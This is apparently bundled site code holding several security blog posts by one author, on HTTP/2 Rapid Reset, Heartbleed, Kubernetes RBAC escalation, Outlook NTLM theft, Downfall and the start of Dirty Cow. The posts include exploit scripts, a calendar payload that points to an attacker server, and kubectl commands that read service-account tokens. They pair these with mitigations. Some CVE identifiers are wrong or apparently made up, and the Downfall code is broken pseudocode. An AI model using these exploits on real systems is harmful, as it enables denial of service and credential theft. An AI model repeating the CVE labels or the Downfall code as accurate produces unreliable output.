            conn = h2.connection.H2Connection()<br>
            conn.initiate_connection()<br>
            tls_sock.sendall(conn.data_to_send())<br><br>

            # Send multiple streams with rapid resets<br>
            for stream_id in range(1, STREAM_COUNT * 2, 2):  # HTTP/2 streams are odd-numbered<br>
                conn.send_headers(<br>
                    stream_id=stream_id,<br>
                    headers=[<br>
                        (":method", "GET"),<br>
                        (":path", "/"),<br>
                        (":authority", TARGET_HOST),<br>
                        (":scheme", "https"),<br>
                    ],<br>
                )<br>
                tls_sock.sendall(conn.data_to_send())<br>
                conn.reset_stream(stream_id)<br>
                tls_sock.sendall(conn.data_to_send())<br>
                print(f"Stream {stream_id} reset sent")<br>
            time.sleep(5)<br><br>

if __name__ == "__main__":<br>
    print(f"Launching HTTP/2 Rapid Reset Attack on {TARGET_HOST}...")<br>
    send_reset_attack()<br>
    print("Attack complete. Check server performance.")<br>
          </code>
        </div>
        <p><strong>Disclaimer:</strong> This code is for educational purposes only. Testing such exploits without proper authorization is unethical and illegal.</p>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Server Patches:</strong> Server vendors like Apache and Nginx have released patches to mitigate this vulnerability. Update your software to the latest version.</li>
          <li><strong>Implement Rate-Limiting:</strong> Use rate-limiting to restrict the number of HTTP/2 streams and resets per connection.</li>
          <li><strong>Monitor Server Metrics:</strong> Deploy monitoring tools to detect unusual spikes in resource usage associated with HTTP/2 traffic.</li>
          <li><strong>Disable HTTP/2 Temporarily:</strong> If patching is not feasible, disable HTTP/2 support as a temporary mitigation:
            <ul>
              <li><strong>For Apache:</strong> Remove <code>h2</code> from the <code>Protocols</code> directive:</li>
              <code>Protocols h2 h2c http/1.1</code>
              <li><strong>For Nginx:</strong> Remove the <code>http2</code> directive from server configurations.</li>
            </ul>
          </li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–0012, or the HTTP/2 Rapid Reset Attack, underscores the importance of securing web servers against denial-of-service attacks. By applying timely patches, implementing rate-limiting, and monitoring server activity, organizations can mitigate this threat and ensure the availability of their services.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Qh=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Heartbleed (CVE-2014–0160)</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Heartbleed (CVE-2014–0160)</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>Understanding Heartbleed: A Technical Breakdown</h2>
        <p>
          Heartbleed was a flaw in the heartbeat extension of OpenSSL, a widely used library that provides SSL/TLS encryption. The vulnerability was introduced in OpenSSL version 1.0.1 and persisted until version 1.0.1g. The issue stemmed from improper input validation, allowing an attacker to read arbitrary chunks of server memory, up to 64KB per request.
        </p>

        <h3>Heartbeat Extension Basics</h3>
        <p>
          To maintain secure connections, OpenSSL’s heartbeat mechanism allows clients and servers to verify each other’s presence by sending and receiving “heartbeat” messages. Here’s how the message exchange is supposed to work:
        </p>
        <ol>
          <li>A client sends a heartbeat request containing a payload and specifies the payload length.</li>
          <li>The server echoes the payload back to the client to confirm the connection is still alive.</li>
        </ol>
        <p>
          The vulnerability occurs because the server trusts the client-supplied payload length without verifying it against the actual payload size, leading to memory leaks.
        </p>

        <h3>Simplified Vulnerable Code</h3>
        <div class="code-block">
          <code>
int tls1_process_heartbeat(SSL *s) {<br />
&nbsp;&nbsp;unsigned char *p = &s->s3->rrec.data[0];<br />
&nbsp;&nbsp;unsigned short payload;<br />
&nbsp;&nbsp;unsigned char *buffer, *bp;<br />
&nbsp;&nbsp;payload = (p[0] << 8) | p[1];<br />
&nbsp;&nbsp;buffer = OPENSSL_malloc(1 + 2 + payload + 16);<br />
&nbsp;&nbsp;bp = buffer;<br />
&nbsp;&nbsp;*bp++ = TLS1_HB_RESPONSE;<br />
&nbsp;&nbsp;memcpy(bp, p, payload); // Vulnerable<br />
&nbsp;&nbsp;ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload);<br />
&nbsp;&nbsp;OPENSSL_free(buffer);<br />
}
          </code>
        </div>

        <h2>How Heartbleed Works</h2>
        <p>
          An attacker can exploit this vulnerability by sending a malicious heartbeat request where the payload length is intentionally larger than the actual payload.
        </p>

        <h3>Exploit Example in Python</h3>
        <div class="code-block">
          <code>
import socket<br />
import struct<br />
def create_heartbeat_request():<br />
&nbsp;&nbsp;hb_type = 1<br />
&nbsp;&nbsp;payload = b"Hi"<br />
&nbsp;&nbsp;payload_length = 0xFFFF<br />
&nbsp;&nbsp;return struct.pack(">BHH", hb_type, len(payload), payload_length) + payload<br />
def send_heartbeat_request(host, port):<br />
&nbsp;&nbsp;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />
&nbsp;&nbsp;s.connect((host, port))<br />
&nbsp;&nbsp;s.send(create_heartbeat_request())<br />
&nbsp;&nbsp;response = s.recv(65535)<br />
&nbsp;&nbsp;print("Leaked memory:", response)<br />
send_heartbeat_request("example.com", 443)
          </code>
        </div>

        <h2>Global Chaos and Real-World Impact</h2>
        <p>
          The Heartbleed vulnerability affected a significant portion of the internet, with estimates suggesting that 17% of all secure web servers were compromised. Major companies were forced to take immediate action to patch their systems.
        </p>

        <h2>Detecting Heartbleed</h2>
        <p>
          Security tools like Nmap can be used to detect Heartbleed vulnerabilities. Use the following command:
        </p>
        <div class="code-block">
          <code>
nmap -p 443 --script ssl-heartbleed example.com
          </code>
        </div>

        <h2>Lessons Learned</h2>
        <ul>
          <li><strong>Input Validation:</strong> Validate all inputs, especially lengths and buffer sizes.</li>
          <li><strong>Automated Patching Systems:</strong> Ensure systems are regularly updated.</li>
          <li><strong>Memory Safety Practices:</strong> Use memory-safe programming languages like Rust.</li>
        </ul>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Kh=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–1001: Kubernetes RBAC Misconfiguration</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–1001: Kubernetes RBAC Misconfiguration</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–1001?</h2>
        <p>
          Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.
        </p>

        <h3>RBAC in Kubernetes</h3>
        <p>
          RBAC allows administrators to define who can access resources in a Kubernetes cluster and what actions they can perform. Permissions are granted using Roles, Cluster Roles, and Role Bindings.
        </p>

        <h2>The Vulnerability</h2>
        <p>
          CVE-2024–1001 occurs when overly permissive RBAC configurations allow attackers to escalate privileges. Specifically:
        </p>
        <ul>
          <li>Permissions like “create” or “patch” on sensitive resources (e.g., Pods) can be abused.</li>
          <li>Attackers can deploy malicious workloads, extract secrets, or control the cluster API server.</li>
        </ul>

        <h2>Exploit Workflow</h2>
        <h3>RBAC Misconfiguration</h3>
        <div class="code-block">
          <code>
apiVersion: rbac.authorization.k8s.io/v1<br>
kind: Role<br>
metadata:<br>
&nbsp;&nbsp;namespace: vulnerable-namespace<br>
&nbsp;&nbsp;name: overly-permissive-role<br>
rules:<br>
- apiGroups: [""]<br>
&nbsp;&nbsp;resources: ["pods", "secrets"]<br>
&nbsp;&nbsp;verbs: ["get", "create", "patch"]<br>
          </code>
        </div>
        <p>This Role allows anyone bound to it to create and patch Pods and access secrets in the namespace.</p>

        <h3>Step-by-Step Exploit</h3>
        <ol>
          <li><strong>Gain Initial Access:</strong> Assume the attacker has access to a low-privileged service account in the namespace, bound to the misconfigured Role.</li>
          <li><strong>Create a Malicious Pod:</strong> Use the <code>kubectl</code> command to create a Pod with elevated privileges:
            <div class="code-block">
              <code>
kubectl run malicious-pod --image=alpine --restart=Never -- /bin/sh -c "apk add curl; while true; do sleep 3600; done"
              </code>
            </div>
          </li>
          <li><strong>Access Sensitive Secrets:</strong> Once the Pod is running, exec into it:
            <div class="code-block">
              <code>
kubectl exec -it malicious-pod -- /bin/sh<br>
# Inside the Pod:<br>
curl -s -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \\ <br>
https://kubernetes.default.svc/api/v1/namespaces/vulnerable-namespace/secrets
              </code>
            </div>
          </li>
          <li><strong>Escalate Privileges:</strong> Create Pods with privileged containers:
            <div class="code-block">
              <code>
kubectl apply -f - <<EOF<br>
apiVersion: v1<br>
kind: Pod<br>
metadata:<br>
&nbsp;&nbsp;name: root-access-pod<br>
&nbsp;&nbsp;namespace: kube-system<br>
spec:<br>
&nbsp;&nbsp;containers:<br>
&nbsp;&nbsp;- name: root-access-container<br>
&nbsp;&nbsp;&nbsp;&nbsp;image: alpine<br>
&nbsp;&nbsp;&nbsp;&nbsp;securityContext:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;privileged: true<br>
&nbsp;&nbsp;&nbsp;&nbsp;command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]<br>
EOF
              </code>
            </div>
          </li>
        </ol>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Enforce the Principle of Least Privilege:</strong> Grant only the minimum permissions necessary for users and service accounts to perform their tasks. Avoid broad permissions like “create” or “patch” on sensitive resources.</li>
          <li><strong>Audit RBAC Policies:</strong> Regularly audit your RBAC configurations to identify overly permissive Roles and ClusterRoles:
            <div class="code-block">
              <code>
kubectl get roles,clusterroles,rolebindings,clusterrolebindings --all-namespaces
              </code>
            </div>
          </li>
          <li><strong>Use Pod Security Standards:</strong> Apply Pod Security Standards (PSS) to restrict privileged Pod creation:
            <div class="code-block">
              <code>
apiVersion: policy/v1beta1<br>
kind: PodSecurityPolicy<br>
metadata:<br>
&nbsp;&nbsp;name: restricted<br>
spec:<br>
&nbsp;&nbsp;privileged: false
              </code>
            </div>
          </li>
          <li><strong>Enable Logging and Monitoring:</strong> Monitor for suspicious activities, such as unauthorized Pod creation or access to secrets. Tools like Falco or Kubernetes Audit Logs can help.</li>
          <li><strong>Use Network Policies:</strong> Restrict Pod-to-Pod communication using Kubernetes Network Policies to limit the attack surface.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–1001 underscores the importance of careful RBAC configuration in Kubernetes. Misconfigured permissions can open the door to attackers, allowing them to escalate privileges and take over a cluster. By enforcing least privilege, auditing RBAC policies, and using Pod Security Standards, organizations can safeguard their Kubernetes environments.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Yh=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2017–11882?</h2>
        <p>
          CVE-2017–11882 is a critical vulnerability within Microsoft Office’s Equation Editor component. This legacy feature, designed for displaying mathematical equations, contains a memory corruption flaw that lets attackers execute malicious code when users open a specially crafted document. Attackers can exploit this weakness to install malware, steal data, or gain full control over a target system with the same permissions as the user.
        </p>

        <h3>Affected Office Versions:</h3>
        <ul>
          <li>Microsoft Office 2007 (Service Pack 3)</li>
          <li>Microsoft Office 2010 (Service Pack 2)</li>
          <li>Microsoft Office 2013 (Service Pack 1)</li>
          <li>Microsoft Office 2016</li>
        </ul>
        <p>
          Despite being patched in November 2017, the Equation Editor vulnerability remains a key target, with unpatched systems or older Office versions still vulnerable.
        </p>

        <h2>How the Vulnerability Works</h2>
        <p>
          This vulnerability allows remote code execution (RCE) by corrupting memory through Office’s Object Linking and Embedding (OLE) feature when opening a malicious document. Here’s how an attack typically unfolds:
        </p>
        <ol>
          <li><strong>Phishing:</strong> The attacker sends an email with an attachment, like a Word or Excel document, designed to exploit CVE-2017–11882.</li>
          <li><strong>User Action:</strong> The user opens the document, unknowingly triggering malicious code within the Equation Editor.</li>
          <li><strong>System Compromise:</strong> The attacker gains control over the system, potentially installing further malware, stealing sensitive data, or using the compromised system to attack other network resources.</li>
        </ol>

        <h2>Why CVE-2017–11882 Remains a Top Target</h2>
        <p>
          This vulnerability is highly favored by cybercriminals and nation-state hackers from countries like China, Russia, and North Korea. Both the Department of Homeland Security and the FBI have flagged it as a frequently exploited vulnerability. Its persistence can be attributed to:
        </p>
        <ul>
          <li><strong>Ease of Exploitation:</strong> Attackers only need to convince users to open a document, making social engineering attacks highly effective.</li>
          <li><strong>Legacy Code:</strong> The Equation Editor, dating back to 2000, is incompatible with modern Office security features, making it difficult to defend without patching.</li>
          <li><strong>Prevalence of Unpatched Systems:</strong> Many organizations, particularly those with older Office versions, haven’t applied Microsoft’s 2017 patch, leaving them vulnerable.</li>
        </ul>

        <h2>How to Protect Against CVE-2017–11882</h2>
        <p>
          With patches readily available, mitigating CVE-2017–11882 is straightforward, yet it requires proactive security practices. Here’s how organizations can protect themselves:
        </p>
        <ol>
          <li><strong>Update Microsoft Office:</strong> Ensure all Office versions are up-to-date with Microsoft’s security patches. Microsoft’s November 2017 patch addresses CVE-2017–11882 and should be applied immediately to unpatched systems.</li>
          <li><strong>Disable the Equation Editor:</strong> If this feature is unnecessary for your organization, disable it. Doing so removes a significant attack vector.</li>
          <li><strong>Use Modern Endpoint Protection:</strong> Employ advanced endpoint security tools that can detect and block malicious document activity. Many modern security solutions offer protections specifically designed to detect CVE-2017–11882 exploitation.</li>
          <li><strong>User Awareness and Training:</strong> Social engineering plays a significant role in the success of attacks exploiting this vulnerability. Educate users on the risks of opening unknown attachments or clicking links in unsolicited emails.</li>
        </ol>

        <h2>Staying Ahead of Persistent Threats</h2>
        <p>
          The continued exploitation of CVE-2017–11882 underscores the importance of regular patching, user education, and layered security defenses. A vulnerability like this, embedded in software many organizations rely on daily, is a stark reminder that cybersecurity requires constant vigilance.
        </p>
        <p>
          By applying patches, disabling unused features, and maintaining a robust security posture, organizations can effectively protect themselves against even the oldest and most persistent threats in today’s digital landscape. In cybersecurity, diligence, and preparedness are the best defenses against exploitation — whether it’s a vulnerability from yesterday or one that emerges tomorrow.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Xh=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>How CVE-2023–23397 Works</h2>
        <p>
          The vulnerability exploits how Microsoft Outlook handles reminders and calendar invites. Normally, Outlook processes these items to display notifications and updates. However, in this case, attackers can create a specially crafted message that tricks Outlook into making an outbound connection to a server under the attacker’s control. This connection is made using NTLM authentication, sending the victim’s NTLM credentials and exposing them to potential misuse.
        </p>

        <h3>Exploit Scenario</h3>
        <ol>
          <li>An attacker crafts a malicious email containing a reminder or calendar invite.</li>
          <li>The email specifies a UNC (Universal Naming Convention) path that points to an attacker-controlled server.</li>
          <li>When Outlook receives and processes this email, it automatically tries to access the specified UNC path, triggering NTLM authentication and sending the victim’s credentials to the attacker.</li>
        </ol>

        <h3>Code and Example</h3>
        <div class="code-block">
          <code>
import http.server<br>
import socketserver<br><br>
class MyRequestHandler(http.server.SimpleHTTPRequestHandler):<br>
&nbsp;&nbsp;&nbsp;&nbsp;def do_GET(self):<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"Received connection from: {self.client_address}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.send_response(200)<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.end_headers()<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.wfile.write(b"Hello, you've been logged!")<br><br>
PORT = 8000<br>
handler = MyRequestHandler<br>
with socketserver.TCPServer(("", PORT), handler) as httpd:<br>
&nbsp;&nbsp;&nbsp;&nbsp;print(f"Serving on port {PORT}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;httpd.serve_forever()<br>
          </code>
        </div>

        <h3>Malicious Email Payload Example</h3>
        <div class="code-block">
          <code>
BEGIN:VCALENDAR<br>
VERSION:2.0<br>
BEGIN:VEVENT<br>
UID:123456<br>
SUMMARY:Malicious Reminder<br>
DTSTART;TZID=Europe/London:20231105T090000<br>
ATTACH;VALUE=URI:\\\\attacker-controlled-server.com\\malicious\\path<br>
END:VEVENT<br>
END:VCALENDAR<br>
          </code>
        </div>

        <h2>Impact and Risks</h2>
        <ul>
          <li><strong>Credential Theft:</strong> If an attacker successfully captures NTLM credentials, they can use them to authenticate against other systems on the same network, potentially gaining unauthorized access.</li>
          <li><strong>No User Interaction Needed:</strong> The lack of user interaction makes this vulnerability particularly dangerous, as even vigilant users can fall victim without realizing it.</li>
          <li><strong>Enterprise Threat:</strong> Organizations with a large number of Outlook users are especially at risk, as the exploit can be used to pivot through corporate networks.</li>
        </ul>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Update Microsoft Outlook:</strong> Microsoft has released patches for this vulnerability. Ensure that all systems are updated to the latest version of Outlook.</li>
          <li><strong>Disable SMB Outbound Traffic:</strong> Blocking outbound SMB traffic at the network perimeter can prevent credentials from being sent to an external server.</li>
          <li><strong>Use Protected Users Group:</strong> Members of this group in Active Directory are protected against NTLM authentication.</li>
          <li><strong>Implement NTLM Blocking Policies:</strong> Where possible, configure policies to restrict NTLM authentication and enforce Kerberos.</li>
        </ol>

        <h3>Defensive Example in PowerShell</h3>
        <div class="code-block">
          <code>
Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0" -Name "RestrictSendingNTLMTraffic" -Value "2"
          </code>
        </div>
        <p>
          This command enforces NTLM restrictions, significantly reducing the risk of credential theft.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,qh=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Downfall (CVE-2022–40982)?</h2>
        <p>
          In August 2023, a critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.
        </p>

        <h2>Speculative Execution</h2>
        <p>
          Modern CPUs optimize performance by predicting and executing instructions ahead of time through speculative execution. However, speculative execution does not adhere to standard security checks during execution, which creates opportunities for attackers to access restricted data.
        </p>

        <h2>Downfall’s Mechanism</h2>
        <p>
          Downfall specifically exploits speculative execution in Advanced Vector Extensions (AVX). It leverages a use-after-free vulnerability during the speculative execution of AVX instructions to access sensitive data stored in vector registers.
        </p>

        <h2>Conceptual Exploit Example</h2>
        <p>
          Below is a conceptual C pseudocode to demonstrate how speculative execution attacks like Downfall work. This example is strictly for educational purposes only to understand the mechanics of such vulnerabilities.
        </p>
        <div class="code-block">
          <code>
#include &lt;stdio.h&gt;<br>
#include &lt;immintrin.h&gt;  // For AVX instructions<br>
#include &lt;stdint.h&gt;<br><br>

// Step 1: Setup memory and registers<br>
void setup_sensitive_data() {<br>
    volatile char secret[] = "SensitiveData"; // Simulated sensitive data<br>
    __m256i vector_data = _mm256_loadu_si256((__m256i *)secret); // Load data into vector register<br>
}<br><br>

// Step 2: Induce speculative execution<br>
void trigger_speculative_execution(char *probe_array) {<br>
    volatile uint64_t timing;<br>
    int speculative_index = 1024; // An index beyond bounds for speculative execution<br>
    char leaked_value;<br><br>

    // Access array in a way to induce speculative execution<br>
    if (speculative_index &lt; 512) {  // This branch is speculatively executed<br>
        leaked_value = probe_array[speculative_index];<br>
    }<br><br>

    // Measure timing to infer accessed value (side-channel analysis)<br>
    for (int i = 0; i &lt; 256; i++) {<br>
        timing = measure_timing(&amp;probe_array[i * 64]); // Simulated timing measurement<br>
        if (timing &lt; THRESHOLD) {<br>
            printf("Leaked value: %c\\n", i); // Print inferred value<br>
        }<br>
    }<br>
}<br><br>

// Step 3: Measure cache timing (side-channel)<br>
uint64_t measure_timing(void *addr) {<br>
    uint64_t start, end;<br>
    asm volatile (<br>
        "mfence\\n"<br>
        "lfence\\n"<br>
        "rdtsc\\n"      // Read time-stamp counter<br>
        "mov %%rax, %0\\n"<br>
        "mov (%1), %%r8\\n" // Access memory<br>
        "rdtscp\\n"<br>
        "mov %%rax, %1\\n"<br>
        "mfence\\n"<br>
        : "=r"(start), "=r"(end)<br>
        : "r"(addr)<br>
        : "rax", "rbx", "rcx", "r8"<br>
    );<br>
    return end - start;<br>
}<br><br>

// Main Function<br>
int main() {<br>
    char probe_array[256 * 64]; // Array for side-channel timing analysis<br><br>

    setup_sensitive_data();<br>
    trigger_speculative_execution(probe_array);<br><br>

    return 0;<br>
}
          </code>
        </div>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Intel Microcode Updates:</strong> Intel has released microcode updates to mitigate speculative execution vulnerabilities like Downfall. Update your system’s firmware to the latest version provided by your hardware vendor.</li>
          <li><strong>Implement Operating System Mitigations:</strong> Operating system vendors have introduced software-level protections, such as disabling AVX extensions on affected processors when microcode updates are unavailable.</li>
          <li><strong>Restrict Local Access:</strong> Ensure only trusted users have access to systems. Many speculative execution vulnerabilities require local access to exploit.</li>
          <li><strong>Monitor Performance Impact:</strong> Mitigations may degrade performance, especially for workloads heavily reliant on AVX instructions. Assess the trade-offs based on your environment.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Downfall (CVE-2022–40982) demonstrates the dangers of speculative execution vulnerabilities and the importance of constant vigilance in securing modern computing environments. Organizations must prioritize patching, enforce security policies, and consider performance impacts to balance security and efficiency.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Jh=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Dirty Cow?</h2>
        <p>
          In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.
        </p>

        <h2>What is Copy-On-Write (COW)?</h2>
        <p>
          Copy-On-Write (COW) is a memory optimization technique in Linux where multiple processes share the same memory pages for read operations. If one process tries to modify a shared page, the kernel creates a private copy for that process, ensuring changes don’t affect the original shared memory.
        </p>

        <h2>The Problem</h2>
        <p>
          Dirty Cow arises from a race condition in the kernel’s <code>mmap</code> system call during the handling of COW. By exploiting this condition, an attacker can gain write access to read-only memory, effectively modifying protected files like <code>/etc/passwd</code> or <code>/etc/shadow</code> to escalate privileges.
        </p>

        <h2>Exploitation Workflow</h2>
